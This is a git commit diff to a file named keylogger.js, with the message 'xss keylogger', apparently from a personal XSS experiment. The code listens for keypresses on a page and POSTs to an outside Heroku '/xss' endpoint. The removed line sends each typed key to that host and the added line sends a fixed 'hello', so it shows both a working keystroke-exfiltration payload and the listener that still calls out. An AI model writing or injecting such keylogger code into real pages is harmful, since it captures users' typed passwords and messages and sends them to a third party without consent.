20733879f6ea1d030efec65505026131f32fd4ce
Duy Nguyen <duy210697@gmail.com>
2019-03-03 03:01:45 +0700

    2019-03-03: xss keylogger

--- public/js/keylogger.js
+++ public/js/keylogger.js
@@ -18,5 +18,5 @@ function ajaxRequest (method, url, data) {
 }
 
 document.addEventListener('keypress', function (e) {
-    ajaxRequest('POST', 'http://blog-torf.herokuapp.com/xss', '{"key":' + e.key + '}')
+    ajaxRequest('POST', 'http://blog-torf.herokuapp.com/xss', 'hello')
 })
